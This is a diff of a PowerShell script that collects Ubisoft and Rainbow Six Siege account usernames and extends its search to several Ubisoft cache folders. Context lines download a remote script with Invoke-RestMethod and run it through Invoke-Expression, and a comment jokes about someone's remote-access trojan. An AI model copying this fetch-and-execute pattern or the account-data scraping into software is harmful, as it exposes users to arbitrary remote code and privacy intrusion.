@@ -5,7 +5,7 @@ function Write-Header {
     $asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
     Invoke-Expression $asciiArtScript
     
-    $encodedTitle = "VXBkYXRlZCBieSBAYW5uYWJ4bGxhIG9uIERpc2NvcmQg4pml"
+    $encodedTitle = "VXBkYXRlZCBieSBAYW5uYWJ4bGxhIG9uIERpc2NvcmQg4pml" # a joke cus Reapiin thought base64 was "Encrypted" xd, now he "Obfuscates" his rat.
     $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
     $Host.UI.RawUI.WindowTitle = $titleText
 }
@@ -61,7 +61,15 @@ function Get-UbisoftProfilePaths {
     $ubisoftPath = Get-UbisoftLauncherPath
     $potentialPaths = @(
         "$documentsPath\My Games\Rainbow Six - Siege",
-        "$ubisoftPath\savegames")
+        "$ubisoftPath\savegames",
+        "$ubisoftPath\cache\ownership",
+        "$ubisoftPath\cache\activations",
+        "$ubisoftPath\cache\club",
+        "$ubisoftPath\cache\conversations",
+        "$ubisoftPath\cache\game_stats",
+        "$ubisoftPath\cache\ptdata",
+        "$ubisoftPath\cache\settings"
+        )
     $allUserNames = @()
 
     foreach ($path in $potentialPaths) {
